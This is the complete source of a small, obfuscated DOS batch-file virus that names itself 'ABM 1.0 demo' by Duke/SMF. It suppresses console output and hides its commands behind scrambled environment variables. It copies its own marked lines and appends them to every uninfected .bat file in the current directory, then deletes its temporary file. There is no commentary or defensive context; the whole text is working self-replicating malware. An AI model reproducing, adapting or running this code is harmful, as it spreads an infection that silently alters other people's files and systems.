;@set lpr=ctty
;@set rh=nul
;@%lpr% %rh%
;@set mi=if
;@set sqd="%0
;@set lpr="
;@set ky=goto
;@set vie=;@
;@%mi% %sqd%==%lpr% %ky% %vie%
;@set lpr="%1
;@set rh="@
;@set sqd=;@z
;@%mi% %lpr%==%rh% %ky% %sqd%
;@set lpr=echo.
;@set nji=@.bat
;@%lpr%>%nji%
;@set sj=find
;@set ysq=";@"
;@set lpr=%0
;@%sj% %ysq%<%lpr%>>%nji%
;@set lpr=for
;@set hmv=%%b
;@set rh=in
;@set sqd=(*.bat)
;@set sq=do
;@set ln=call
;@set xtq=@
;@%lpr% %hmv% %rh% %sqd% %sq% %ln% %xtq% %xtq% %hmv%
;@set lpr=del
;@set rh=@.*
;@%lpr% %rh%
;@%ky% %vie%
:;@z [ABM 1.0 demo] by Duke/SMF
;@set epq=%2
;@%sj% %ysq%<%epq%
;@set lpr=errorlevel
;@set rh=1
;@set sqd=type
;@%mi% %lpr% %rh% %sqd% %nji%>>%epq%
:;@
